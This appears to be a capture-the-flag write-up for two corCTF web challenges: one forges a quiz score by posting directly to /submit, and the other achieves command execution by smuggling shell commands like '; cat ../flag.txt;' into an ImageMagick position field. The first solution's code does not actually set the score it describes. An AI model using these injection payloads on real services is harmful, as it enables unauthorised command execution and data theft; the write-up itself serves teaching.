# Web

## web/jsonquiz
A json quiz with 15 questions ripped from Linkedin Skills Assessment

It does not matter if u do the quiz or not

```js
// start() function
while(quiz.length !== 15)

// finish function
setTimeout(() => {
    let score = 0;
    fetch("/submit", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "score=" + score
    })
    .then(r => r.json())
    .then(j => {
        if (j.pass) {
            $("#reward").innerText = j.flag;
            $("#pass").style.display = "block";
        }
        else {
            $("#fail").style.display = "block";
        }
    });
}, 1250);
```

Score will always be 0, simply send a fetch request to `/submit` with `score=15` and get the flag

Solution:
```js
fetch("/submit", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "score=" + score
    })
    .then(r => r.json())
    .then(j => {
        if (j.pass) {
            $("#reward").innerText = j.flag;
            $("#pass").style.display = "block";
        } else {
            $("#fail").style.display = "block";
        }
    });
```
Flag: `corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}`

## web/msfrog-generator

When we view the source, there is a comment to not try looking for vuln in the front end code aka react app, so we look for a connection or api request.

Clicking generate calls a function with some variables that look like the following: 
```json
[
    {
        "type": "mstongue.png",
        "pos": {
            "x": 153,
            "y": 122
        }
    }
]
```
We get a base64 representation of the generated png file (if you click the generate button it calls another function which saves the base64 to a png file)

We try changing the type to flag.txt in the post request
```json
[
    {
        "type": "flag.txt",
        "pos": {
            "x": 153,
            "y": 122
        }
    }
]
```
and get back 
```
I wont pass a non existing image to a shell command lol
```

At least we are getting somewhere.

Seems like some shell commands are run to create a new png file with the composities from other images. It might be using ImageMagick on the command line.

Now what if we try to mess things up and see if we get some errors?

```json
[
    {
        "type": "mstongue.png",
        "pos": {
            "x": 153,
            "y": "122LOL"
        }
    }
]
```
We get back
```sh
Something went wrong :
b"convert-im6.q16: invalid argument for option `-geometry': +153+122LOL @ error/convert.c/ConvertImageCommand/1672.\n"
```
This is definitely ImageMagick. What if we simply break the current command and run `;whoami`? 

```json
[
    {
        "type": "mstongue.png",
        "pos": {
            "x": 153,
            "y": "122; whoami"
        }
    }
]
```
We get back 
```sh
Something went wrong :
b"convert-im6.q16: missing an image filename `+153+122' @ error/convert.c/ConvertImageCommand/3226.\nwhoami: invalid option -- 'c'\nTry 'whoami --help' for more information.\n"
```
Looks like we have to add another `;` to call `whoami` on its own

```json
[
    {
        "type": "mstongue.png",
        "pos": {
            "x": 153,
            "y": "122; whoami;"
        }
    }
]
```
And we have RCE

```json
{"msfrog": "www-data\n"}
```

Solution: 

```json
[
    {
        "type": "mstongue.png",
        "pos": {
            "x": 153,
            "y": "122; cat ../flag.txt;"
        }
    }
]
```

Flag: `corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}`
